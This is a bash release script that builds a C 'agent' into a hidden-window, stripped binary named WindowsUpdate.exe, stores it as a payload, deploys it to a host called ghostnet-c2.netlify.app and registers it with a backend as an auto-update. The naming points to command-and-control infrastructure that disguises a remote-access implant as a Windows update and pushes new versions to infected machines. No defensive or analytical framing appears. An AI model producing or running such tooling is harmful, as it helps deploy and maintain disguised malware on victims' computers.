#!/bin/bash
# publish-release.sh — Bump version, tag, and register with backend for auto-update
# Usage: ./publish-release.sh <new-version>

set -euo pipefail

if [ $# -ne 1 ]; then
  echo "Usage: $0 <new-version> (e.g. 1.1.0)"
  exit 1
fi

VERSION="$1"

echo "=== Bumping version in agent.c to $VERSION ==="
sed -i "s/#define AGENT_VERSION       \"[^\"]*\"/#define AGENT_VERSION       \"$VERSION\"/" agent/agent.c

echo "=== Compiling new binary ==="
export PATH="/c/msys64/ucrt64/bin:$PATH"
gcc agent/agent.c -o WindowsUpdate.exe -mwindows -lwinhttp -lpsapi -liphlpapi -ladvapi32 -lshell32 -lws2_32 -O2 -s -static

echo "=== Computing SHA256 ==="
SHA256=$(sha256sum WindowsUpdate.exe | cut -d' ' -f1)
echo "SHA256: $SHA256"

echo "=== Copying binary to payloads ==="
cp WindowsUpdate.exe payloads/agent.exe

echo "=== Deploy to Netlify ==="
npm run build 2>/dev/null
cp -r payloads dist/
npx netlify-cli deploy --prod --dir=dist 2>&1 | tail -5

echo "=== Registering release with backend ==="
npx netlify-cli functions:invoke api \
  --payload "{\"httpMethod\":\"POST\",\"path\":\"/api/releases\",\"body\":\"{\\\"version\\\":\\\"$VERSION\\\",\\\"update_url\\\":\\\"https://ghostnet-c2.netlify.app/payloads/agent.exe\\\",\\\"update_sha256\\\":\\\"$SHA256\\\"}\"}" \
  --no-parse 2>&1 || echo "NOTE: Register release manually via dashboard or curl"

echo ""
echo "=== Done ==="
echo "New version: $VERSION"
echo "Update URL: https://ghostnet-c2.netlify.app/payloads/agent.exe"
echo "SHA256: $SHA256"
echo ""
echo "Commit and push:"
echo "  git add -A"
echo '  git commit -m "Release v'$VERSION'"'
echo "  git tag v$VERSION"
echo "  git push && git push --tags"
